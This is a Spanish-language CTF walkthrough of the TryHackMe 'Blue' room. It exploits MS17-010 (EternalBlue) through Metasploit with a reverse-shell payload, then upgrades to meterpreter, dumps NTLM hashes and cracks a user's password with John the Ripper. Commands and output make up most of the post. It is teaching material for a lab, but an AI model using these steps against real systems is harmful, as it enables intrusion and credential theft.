---
title: "Blue - TryHackMe"
layout: single
excerpt: "Maquina THM de dificultad facil, cual vamos a desplegar y hackear una máquina con Windows, aprovechando problemas comunes de mala configuración."
show_date: true
classes: wide
header:
  teaser: /assets/images/CTFs/Blue-THM/icon.png
  teaser_home_page: true  
  icon: /assets/images/TryHackMe-icon.png
categories:
  - TryHackMe
  - Easy
tags:
  - Windows
  - Samba
---

# Reconocimiento 🔎 

---

Vamos a comenzar con un escaneo de puertos utilizando la herramienta nmap y agregamos el parametro `--script vuln`, para encontrar vulnerabilidad en los puertos:
```bash
nmap -sV --script vuln $IPv             
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-18 18:38 CEST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.70.247
Host is up (0.059s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb-vuln-ms10-054: false
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 183.60 seconds
```
Como podemos ver existen bastantes puertos abierto pero el que nos interesa es el que hay vulnerabilidades en el.

- ms17-10: Remote Code Execution(RCE) in SMB server.
<br><br>

# Explotación 🔑

---

Para comenzar con la fase de explotación al ya saber la vulnerabilidad. Vamos a iniciar metasploit:
```bash
sudo msfdb init && msfdb run
```

Y  ahora vamos a buscar nuestro exploit en esta herramienta. `search ms17-10` <br>
Aparecerán varios, pero el que nos interesa es `exploit/windows/smb/ms17_010_eternalblue`
<br>
```bash
use exploit/windows/smb/ms17_010_eternalblue
```
<br>

Ahora nos toca configurar este exploit con el siguiente comando podremos ver lo necesario:
```bash
show options
```

Vamos lo necesario:
- RHOSTS (Dirección IP del servidor)
- LHOST (Nuestra dirección IP)

Hay que recordar que si estamos en la VPN de TryHackMe deberemos poner la IP de la red donde se encuentra la máquina víctima.
Ya teniendo todo listo ejeutamos el exploit:
```bash
run
```
Si la session no es creada puede que tengamos configurados por predeterminado el payload, lo tenemos que poner con el siguiente:
```bash
set PAYLOAD generic/shell_reverse_tcp
```
Una vez tengamos la session, se nos habrá creado una shell.

<br><br>

# Escalada de Privilegios 🚀

---

Escribimos `whoami` para confirmar que estamos en `NT AUTHORITY/SYSTEM`

Si intenta poner en segundo plano la sesión usando Ctrl+Z, también se colocará en segundo plano su msfconsole y estará en el shell bash. Si hizo eso para volver a su shell de Windows en msfconsole, escriba el comando `fg`.

Para comenzar la escalada de privilegios vamos a convertir nuestra shell a una sesion meterpreter.

Podemos hacerlo con el comando `sessions -u <sesion-ID>` o con el siguiente modulo:
```bash
use post/multi/manage/shell_to_meterpreter
```

Utilizaremos `show options` para ver las opciones y el requisito que tenemos que poner es el numero de la sesión. Para poder verlo ejecutamos el comando:
```bash
sessions
```

Teniendo el id de la sesión de nuestra shell de windows.
```bash
set SESSION <sesión-ID>
```

Y ya podemos ejecutar el exploit con el comando `run`.

**Si el exploit no funciona deberemos reciniar la máquina, y realizar todos lo pasos de nuevo.**

Para entrar en sesión meterpreter:
```bash
sessions <sesión-ID>
```
Una vez dentro vamos a ejecutar el comando `ps` para ver todos los procesos que están corriendo en esta máquina.
```bash
meterpreter > ps
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 100   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM   C:\Windows\system32\LogonUI.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 432   688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 524   688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 688   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 716   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 724   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 784   2564  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
 824   688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 896   688   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 948   688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1076  688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1164  688   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1284  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1308  688   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1344  688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1396  688   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1480  688   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1568  824   WmiPrvSE.exe
 1596  688   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config
                                                                                .exe
 1880  688   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1972  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 1988  1308  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2196  2784  mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ms
                                                                                corsvw.exe
 2564  2876  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powersh
                                                                                ell.exe
 2568  688   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM
 2768  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2784  688   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ms
                                                                                corsvw.exe
 2836  688   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2864  688   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2900  688   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2976  688   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
```

La mayor parte del tiempo, su proceso debería ejecutarse como NT AUTHORITY/SYSTEM, pero si no es el caso, debe migrar a otro proceso. Anote el PID de cualquier proceso que se ejecute como NT AUTHORITY/SYSTEM. Para migrar a ese proceso:
```bash
migrate PID
```

### Cracking
Si seguimos en la sesión de meterpreter, ejecutamos el comando `hashdump` para volcar los usuarios y los hash de las contraseñas.
```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Ahora vamos a guardar estas contraseñas en un fichero, en mi caso solo voy a guardar la que nos interesa que es el usuario Jon.
```bash
cat tocrack        
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

Teniendo este fichero vamos a dejar la sesión meterpreter en segundo plano y vamos a crackear la contraseña con la herramienta Jhon the Ripper.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt tocrack --format=NT
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)     
1g 0:00:00:00 DONE (2023-04-19 19:30) 1.923g/s 19616Kp/s 19616Kc/s 19616KC/s alr19882006..alpusidi
```

### Buscando las Flags

Volvemos a la sesión meterpreter y escribimos lo siguiente:
```bash
meterpreter > search -f "flag*"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Found 6 results...
==================

Path                                                             Size (bytes)  Modified (UTC)
----                                                             ------------  --------------
c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag1.lnk  482           2019-03-17 20:26:42 +0100
c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag2.lnk  848           2019-03-17 20:30:04 +0100
c:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent\flag3.lnk  2344          2019-03-17 20:32:52 +0100
c:\Users\Jon\Documents\flag3.txt                                 37            2019-03-17 20:26:36 +0100
c:\Windows\System32\config\flag2.txt                             34            2019-03-17 20:32:48 +0100
c:\flag1.txt                                                     24            2019-03-17 20:27:21 +0100
```

Y ya con el comando:
```bash
cat <Ruta_completa_del_fichero_flag>
```
O si lo queremos hacer desde shell:
```bash
type <Ruta_completa_del_fichero_flag>
```
Podremos ver todas las flags que queramos.

**Enhorabuena, conmpletaste la room.**

<br>

---

<br>
Espero que te haya servido de ayuda este post. Me ayudarías mucho si lo compartes en tus **RRSS**, GRACIAS!